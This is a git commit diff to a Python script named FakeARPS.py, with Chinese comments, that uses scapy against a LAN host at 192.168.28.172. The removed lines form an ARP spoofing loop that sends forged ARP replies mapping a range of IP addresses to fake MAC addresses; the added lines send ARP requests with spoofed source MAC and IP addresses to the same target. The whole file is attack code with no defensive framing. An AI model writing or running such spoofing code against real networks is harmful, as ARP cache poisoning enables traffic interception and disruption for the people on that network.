b4dfad0171b2424011177e99c579ea355ecc3cf4
miss5610 <miss5610@gmail.com>
2025-06-26 14:42:08 +0800

    更新

--- ARP/FakeARPS.py
+++ ARP/FakeARPS.py
@@ -1,32 +1,18 @@
-from scapy.all import ARP, send
-import time
+from scapy.all import ARP, Ether, srp
 
-# 目標設備
-target_ip = "192.168.28.172"
-target_mac = "00:50:56:AE:8E:0B"
+#'00:e0:4c:68:5a:55' 'ff:ff:ff:ff:ff:ff' "00:00:00:00:00:00"
 
-# IP/MAC 起始值
-spoof_ip_base = "192.168.28."
-spoof_ip_start = 191  # 從 .191 開始
-mac_prefix = "12:34:56:78:9a"
-mac_suffix_start = 0xbc  # 188 (十六進位 bc)
+def getIPV4MAC(src,psrc,dstip:str):
+    arprequest = Ether(src=src,dst='ff:ff:ff:ff:ff:ff') \
+        / ARP(op=1,hwsrc=src,hwdst='00:00:00:00:00:00',psrc=psrc,pdst=dstip)
+    result , nums = srp(arprequest, retry=2, timeout =5,iface='乙太網路 2')
+    return result[0][1][ARP].hwsrc if result else None
 
-# 發送次數
+
 for i in range(10):
     # 計算遞增的 IP 和 MAC 尾數
-    current_ip = f"{spoof_ip_base}{(spoof_ip_start + i) % 256}"
-    current_mac_suffix = (mac_suffix_start + i) % 256
-    fake_mac = f"{mac_prefix}:{current_mac_suffix:02x}"
+    current_ip = f"{'192.168.28.'}{(1 + i) % 256}"
+    current_mac_suffix = (0xbc + i) % 256
+    fake_mac = f"{"12:34:56:78:9a"}:{current_mac_suffix:02x}" # 188 (十六進位 bc)
 
-    # 構造 ARP 回應封包
-    arp_response = ARP(
-        op=2,
-        pdst=target_ip,
-        hwdst=target_mac,
-        psrc=current_ip,
-        hwsrc=fake_mac
-    )
-
-    print(f"[{i+1}] Sending ARP spoof: {current_ip} is at {fake_mac}")
-    send(arp_response, verbose=True)
-    time.sleep(0.3)  # 每秒發一次
+    a = getIPV4MAC(fake_mac,current_ip,'192.168.28.172')
